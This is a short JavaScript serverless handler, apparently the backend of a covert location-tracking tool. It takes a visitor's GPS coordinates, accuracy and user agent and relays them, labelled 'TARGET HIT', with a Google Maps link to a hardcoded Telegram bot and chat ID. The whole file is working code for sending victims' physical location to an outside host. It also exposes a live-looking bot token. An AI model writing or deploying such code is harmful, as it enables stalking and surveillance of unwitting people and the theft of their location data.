export default async function handler(req, res) {
    // Set Header biar gak kena CORS error
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Mau ngapain lo?' });
    }

    const { lat, lon, acc, ua } = req.body;
    
    // --- WAJIB GANTI ---
    const TOKEN = '8356478832:AAF3L_qYj0NSENOXuuwn-PAJBBAiCiQVnGI';
    const CHAT_ID = '6576965530';

    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const text = `🚀 **TARGET HIT VERCEL!** 🚀\n\n🎯 **Accuracy:** ${acc}m\n📍 **Maps:** ${mapLink}\n📱 **Device:** ${ua}`;

    try {
        const teleResponse = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            })
        });

        const result = await teleResponse.json();

        if (result.ok) {
            return res.status(200).json({ status: 'sent', detail: 'Data masuk, Bos!' });
        } else {
            return res.status(500).json({ status: 'error', detail: result.description });
        }
    } catch (error) {
        return res.status(500).json({ status: 'error', detail: error.message });
    }
}
